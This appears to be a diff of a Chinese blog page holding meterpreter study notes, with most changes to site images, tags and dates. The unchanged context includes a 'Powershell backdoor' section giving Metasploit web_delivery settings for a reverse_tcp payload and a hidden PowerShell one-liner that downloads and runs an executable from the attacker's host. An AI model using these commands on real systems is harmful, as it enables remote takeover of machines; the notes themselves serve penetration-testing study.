@@ -24,6 +24,8 @@
 <link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
   
+  <meta name="keywords" content="meterpreter学习笔记" />
+
 
 <link rel="canonical" href="http://chungod.github.io/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/">
 
@@ -100,12 +102,12 @@ go-forward = 乌云后面依然是灿烂的晴天</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfb3vzhj20zk0m8wny.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitf0kl1j20zk0m87fe.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevuctzzj20zk0m84qp.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeuv80yoj20zk0m8kjl.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclffsa1cj20zk0m811l.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclx6phq6j20zk0m8e36.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeuibk9fj20zk0m8ay2.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg"></li>
         </ul>
       </div>
     </header>
@@ -312,6 +314,9 @@ go-forward = 乌云后面依然是灿烂的晴天</title>
 <h3 id="powershell-后门"><a class="markdownIt-Anchor" href="#powershell-后门">#</a> Powershell 后门</h3>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">147</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">2334</span></span><br><span class="line"><span class="built_in">set</span> srvport <span class="number">2333</span></span><br><span class="line"><span class="built_in">set</span> uripath /</span><br><span class="line"><span class="built_in">set</span> target <span class="number">5</span></span><br><span class="line">run</span><br><span class="line">在目标设备 <span class="built_in">cmd</span> 上执行以下命令即可反弹</span><br><span class="line">powershell.exe -nop -w hidden -c $z=&quot;<span class="built_in">echo</span> ($env:temp+&#x27;\eJedcsJE.exe&#x27;)&quot;; (new-object</span><br><span class="line">System.<span class="built_in">Net</span>.WebClient).DownloadFile(&#x27;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">147</span>:<span class="number">2333</span>/&#x27;, $z); invoke-item $z</span><br></pre></td></tr></table></figure>
 
+      <div class="tags">
+          <a href="/tags/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"><i class="ic i-tag"></i> meterpreter学习笔记</a>
+      </div>
   </div>
 
    <footer>
@@ -322,7 +327,7 @@ go-forward = 乌云后面依然是灿烂的晴天</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2021-05-03 14:14:51" itemprop="dateModified" datetime="2021-05-03T14:14:51+08:00">2021-05-03</time>
+    <time title="修改时间：2021-05-04 13:53:33" itemprop="dateModified" datetime="2021-05-04T13:53:33+08:00">2021-05-04</time>
   </span>
   <span id="2021/04/21/meterpreter学习笔记总结/" class="item leancloud_visitors" data-flag-title="meterpreter学习笔记" title="阅读次数">
       <span class="icon">
@@ -370,7 +375,7 @@ go-forward = 乌云后面依然是灿烂的晴天</title>
     <div class="item left">
       
 
-  <a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclgrvbd6j20zk0m8qv5.jpg" title="Windows内核提权">
+  <a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeu7txpzj20zk0m81kx.jpg" title="Windows内核提权">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>Windows内核提权</h3>
@@ -415,7 +420,7 @@ go-forward = 乌云后面依然是灿烂的晴天</title>
     </div>
     <div class="item tags">
       <a href="/tags/">
-        <span class="count">2</span>
+        <span class="count">4</span>
         <span class="name">标签</span>
       </a>
     </div>
@@ -478,7 +483,7 @@ go-forward = 乌云后面依然是灿烂的晴天</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" title="Windows内核提权">Windows内核提权</a></span>
+    <span><a href="/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" title="内存取证">内存取证</a></span>
   </li>
 
       
@@ -505,7 +510,7 @@ go-forward = 乌云后面依然是灿烂的晴天</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" title="内存取证">内存取证</a></span>
+    <span><a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" title="Windows内核提权">Windows内核提权</a></span>
   </li>
 
   </ul>
